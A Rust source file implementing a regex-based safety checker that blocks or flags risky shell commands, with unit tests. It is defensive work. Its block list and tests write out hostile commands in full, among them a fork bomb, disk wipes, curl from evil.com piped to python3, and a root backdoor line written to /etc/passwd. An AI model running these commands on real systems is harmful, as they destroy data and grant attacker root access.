use regex::Regex;

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub enum PermissionLevel {
    Safe,
    RequiresConfirmation,
    Blocked,
}

#[derive(Debug)]
pub enum SafetyResult {
    Safe,
    RequiresConfirmation { reason: String },
    Blocked { reason: String },
}

pub struct SafetyChecker {
    blocked_patterns: Vec<(Regex, &'static str)>,
    confirm_patterns: Vec<(Regex, &'static str)>,
}

impl SafetyChecker {
    pub fn new() -> Self {
        let blocked_patterns = vec![
            (
                Regex::new(r"rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)?/\s*$").unwrap(),
                "Recursive deletion of root filesystem",
            ),
            (
                Regex::new(r"rm\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\s+/").unwrap(),
                "Recursive forced deletion from root",
            ),
            (
                Regex::new(r"rm\s+-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*\s+/").unwrap(),
                "Recursive forced deletion from root",
            ),
            (
                Regex::new(r"dd\s+.*if=").unwrap(),
                "Raw disk write with dd",
            ),
            (
                Regex::new(r"mkfs\.\w+\s+/dev/").unwrap(),
                "Disk format operation",
            ),
            (
                Regex::new(r">\s*/dev/(sd|nvme|vd|hd)").unwrap(),
                "Raw write to block device",
            ),
            (
                Regex::new(r"\|\s*/dev/(sd|nvme|vd|hd)").unwrap(),
                "Pipe to block device",
            ),
            (
                Regex::new(r":\(\)\s*\{").unwrap(),
                "Fork bomb detected",
            ),
            (
                Regex::new(r"chmod\s+777\s+/\s*$").unwrap(),
                "Dangerous permission change on root",
            ),
            (
                Regex::new(r"chmod\s+-R\s+777\s+/").unwrap(),
                "Recursive dangerous permission change",
            ),
            // Decode-and-execute patterns
            (
                Regex::new(r"base64\s+-d.*\|\s*(ba)?sh").unwrap(),
                "Decode-and-execute via base64",
            ),
            (
                Regex::new(r"(curl|wget)\s+.*\|\s*python[23]?").unwrap(),
                "Pipe from internet to Python interpreter",
            ),
            // Sensitive file modification
            (
                Regex::new(r"(>>?)\s*/etc/(passwd|shadow|sudoers|gshadow|group)\b").unwrap(),
                "Write to sensitive system credentials file",
            ),
            (
                Regex::new(r"\btee\s+/etc/(passwd|shadow|sudoers|gshadow|group)\b").unwrap(),
                "Write to sensitive system credentials file via tee",
            ),
            (
                Regex::new(r"\bvisudo\b").unwrap(),
                "Modification of sudoers configuration",
            ),
            // Disk wiping
            (
                Regex::new(r"\bshred\b.*/dev/(sd|nvme|vd|hd)").unwrap(),
                "Destructive disk wipe with shred",
            ),
        ];

        let confirm_patterns = vec![
            (
                Regex::new(r"(pacman|yay)\s+.*-[a-zA-Z]*R").unwrap(),
                "Package removal",
            ),
            (
                Regex::new(r"(pacman|yay)\s+.*-[a-zA-Z]*S[a-zA-Z]*y[a-zA-Z]*u").unwrap(),
                "System update",
            ),
            (
                Regex::new(r"(pacman|yay)\s+.*-S\s").unwrap(),
                "Package installation",
            ),
            (
                Regex::new(r"systemctl\s+(enable|disable|start|stop|restart|mask)").unwrap(),
                "Service state change",
            ),
            (
                Regex::new(r"sudo\s+").unwrap(),
                "Command requires root privileges",
            ),
            (
                Regex::new(r"(curl|wget)\s+.*\|\s*(ba)?sh").unwrap(),
                "Pipe install from internet",
            ),
            (
                Regex::new(r"reboot|shutdown|poweroff|halt").unwrap(),
                "System power state change",
            ),
            // User account management
            (
                Regex::new(r"\b(useradd|userdel|usermod|groupadd|groupdel)\b").unwrap(),
                "User account modification",
            ),
            (
                Regex::new(r"\bpasswd\b").unwrap(),
                "Password change",
            ),
        ];

        Self {
            blocked_patterns,
            confirm_patterns,
        }
    }

    pub fn check(&self, command: &str) -> SafetyResult {
        let trimmed = command.trim();

        // Check blocked patterns first
        for (pattern, reason) in &self.blocked_patterns {
            if pattern.is_match(trimmed) {
                return SafetyResult::Blocked {
                    reason: reason.to_string(),
                };
            }
        }

        // Check confirmation patterns
        for (pattern, reason) in &self.confirm_patterns {
            if pattern.is_match(trimmed) {
                return SafetyResult::RequiresConfirmation {
                    reason: reason.to_string(),
                };
            }
        }

        SafetyResult::Safe
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn checker() -> SafetyChecker {
        SafetyChecker::new()
    }

    // Blocked
    #[test]
    fn test_blocked_rm_rf_root() {
        assert!(matches!(
            checker().check("rm -rf /"),
            SafetyResult::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_dd() {
        assert!(matches!(
            checker().check("dd if=/dev/zero of=/dev/sda"),
            SafetyResult::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_mkfs() {
        assert!(matches!(
            checker().check("mkfs.ext4 /dev/sda1"),
            SafetyResult::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_fork_bomb() {
        assert!(matches!(
            checker().check(":(){ :|:& };:"),
            SafetyResult::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_chmod_777_root() {
        assert!(matches!(
            checker().check("chmod 777 /"),
            SafetyResult::Blocked { .. }
        ));
    }

    // RequiresConfirmation
    #[test]
    fn test_confirm_pacman_remove() {
        assert!(matches!(
            checker().check("pacman -Rns vlc"),
            SafetyResult::RequiresConfirmation { .. }
        ));
    }

    #[test]
    fn test_confirm_yay_install() {
        assert!(matches!(
            checker().check("yay -S google-chrome"),
            SafetyResult::RequiresConfirmation { .. }
        ));
    }

    #[test]
    fn test_confirm_systemctl() {
        assert!(matches!(
            checker().check("systemctl enable sshd"),
            SafetyResult::RequiresConfirmation { .. }
        ));
    }

    #[test]
    fn test_confirm_sudo() {
        assert!(matches!(
            checker().check("sudo pacman -Syu"),
            SafetyResult::RequiresConfirmation { .. }
        ));
    }

    #[test]
    fn test_confirm_pipe_install() {
        assert!(matches!(
            checker().check("curl https://example.com/install.sh | bash"),
            SafetyResult::RequiresConfirmation { .. }
        ));
    }

    // Safe
    #[test]
    fn test_safe_df() {
        assert!(matches!(checker().check("df -h"), SafetyResult::Safe));
    }

    #[test]
    fn test_safe_free() {
        assert!(matches!(checker().check("free -h"), SafetyResult::Safe));
    }

    #[test]
    fn test_safe_ps() {
        assert!(matches!(
            checker().check("ps aux --sort=-%mem"),
            SafetyResult::Safe
        ));
    }

    #[test]
    fn test_safe_journalctl() {
        assert!(matches!(
            checker().check("journalctl --since today -p err"),
            SafetyResult::Safe
        ));
    }

    #[test]
    fn test_safe_nmcli() {
        assert!(matches!(
            checker().check("nmcli device wifi list"),
            SafetyResult::Safe
        ));
    }

    // Phase 5 — new security patterns
    #[test]
    fn test_blocked_base64_decode_execute() {
        assert!(matches!(
            checker().check("echo aGVsbG8= | base64 -d | sh"),
            SafetyResult::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_curl_pipe_python() {
        assert!(matches!(
            checker().check("curl https://evil.com/payload.py | python3"),
            SafetyResult::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_write_to_passwd() {
        assert!(matches!(
            checker().check("echo 'hacker::0:0:::/bin/bash' > /etc/passwd"),
            SafetyResult::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_visudo() {
        assert!(matches!(
            checker().check("visudo"),
            SafetyResult::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_shred_disk() {
        assert!(matches!(
            checker().check("shred -vz /dev/sda"),
            SafetyResult::Blocked { .. }
        ));
    }

    #[test]
    fn test_confirm_useradd() {
        assert!(matches!(
            checker().check("useradd -m newuser"),
            SafetyResult::RequiresConfirmation { .. }
        ));
    }

    #[test]
    fn test_confirm_passwd() {
        assert!(matches!(
            checker().check("passwd username"),
            SafetyResult::RequiresConfirmation { .. }
        ));
    }
}
